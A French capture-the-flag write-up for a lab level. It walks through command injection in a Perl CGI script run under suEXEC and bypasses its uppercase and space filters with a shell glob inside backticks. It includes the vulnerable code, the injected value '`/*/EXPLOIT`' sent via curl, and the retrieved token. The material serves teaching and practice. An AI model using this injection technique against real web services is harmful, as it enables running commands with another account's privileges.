# Level12

## Démarche

1. **Reconnaissance**

   ```bash
   cd /etc/apache2/sites-enabled/
   ls
   000-default  level05.conf  level12.conf
   ```

   ```apache
   cat level12.conf
   <VirtualHost *:4646>
           DocumentRoot    /var/www/level12/
           SuexecUserGroup flag12 level12
           <Directory /var/www/level12>
                   Options +ExecCGI
                   DirectoryIndex level12.pl
                   AllowOverride None
                   Order allow,deny
                   Allow from all
                   AddHandler cgi-script .pl
           </Directory>
   </VirtualHost>
   ```

   Un VirtualHost Apache sur le port **4646**, exécutant un script CGI Perl
   via **suEXEC** (`SuexecUserGroup flag12 level12`) : le script tourne
   directement avec les droits de `flag12`, comme pour un setuid , toute
   commande shell qu'on parvient à y injecter s'exécute en tant que
   `flag12`.

   ```bash
   strings level12.pl
   ```
   ```perl
   #!/usr/bin/env perl
   use CGI qw{param};
   print "Content-type: text/html\n\n";
   sub t {
     $nn = $_[1];              # param "y"
     $xx = $_[0];               # param "x"
     $xx =~ tr/a-z/A-Z/;        # (1) minuscules -> majuscules
     $xx =~ s/\s.*//;           # (2) coupe tout après le 1er espace
     @output = `egrep "^$xx" /tmp/xd 2>&1`;
     foreach $line (@output) {
         ($f, $s) = split(/:/, $line);
         if($s =~ $nn) {
             return 1;
         }
     }
     return 0;
   }
   sub n {
     if($_[0] == 1) {
         print("..");
     } else {
         print(".");
     }
   }
   n(t(param("x"), param("y")));
   ```

2. **Analyse**

   Le paramètre `x` (`$xx`) est concaténé sans échappement dans une
   commande shell exécutée via des backticks (`` ` ``), qui invoquent
   `/bin/sh -c "..."` :
   ```perl
   @output = `egrep "^$xx" /tmp/xd 2>&1`;
   ```
   C'est une **injection de commande OS** classique , mais deux filtres
   sont appliqués à `$xx` avant l'exécution :

   - `$xx =~ tr/a-z/A-Z/;` : toutes les lettres minuscules deviennent
     majuscules. Impossible d'écrire littéralement `sh`, `bash`,
     `getflag`... elles deviennent `SH`, `BASH`, `GETFLAG`.
   - `$xx =~ s/\s.*//;` : `\s` matche un caractère d'espacement, `.*`
     tout ce qui suit ; remplacé par rien, ça supprime donc **tout à
     partir du premier espace inclus**. Impossible de séparer une
     commande de ses arguments avec un espace classique.

   Le second paramètre `y` (`$nn`) ,Il faut juste qu'il soit présent et non vide pour que le script ne plante pas avant d'exécuter `egrep`.


3. **Faille / principe**


   ```bash
   echo 'getflag > /tmp/flag' > /tmp/EXPLOIT
   chmod +x /tmp/EXPLOIT
   ```

   Ce fichier est créé directement dans un shell normal , il n'est jamais
   passé dans `tr` ni dans `s/\s.*//`

   Le payload envoyé comme `x` n'a plus qu'à désigner ce fichier avec des
   caractères qui survivent aux deux filtres :

   - Le nommer **`EXPLOIT`** (déjà en majuscules) rend `tr/a-z/A-Z/`
     inoffensif , rien ne change.
   - Remplacer le répertoire `/tmp/` par le glob shell **`*`** (un
     caractère spécial, pas une lettre a-z, donc ignoré par `tr`) :
     `/*/EXPLOIT`. Au moment de l'exécution, le shell résout `*` contre
     les vrais noms de fichiers sur le disque et ne garde que ce qui
     matche un fichier existant , ici uniquement `/tmp/EXPLOIT`.
   - Entourer le tout de **backticks** (`` `/*/EXPLOIT` ``) pour
     déclencher une substitution de commande côté shell distant : le
     script est exécuté avant même que `egrep` ne soit lancé.

4. **Contournement / implémentation**

   ```bash
   curl 'localhost:4646?x=`/*/EXPLOIT`&y=42'
   ```

   Détail de la requête :
   - `x=`/*/EXPLOIT`` : le payload d'injection décrit ci-dessus.
   - `y=42` : valeur arbitraire, pour satisfaire les attentes en nombre de paramètre

   Récupération du résultat :
   ```bash
   cat /tmp/flag
   Check flag. Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
   ```
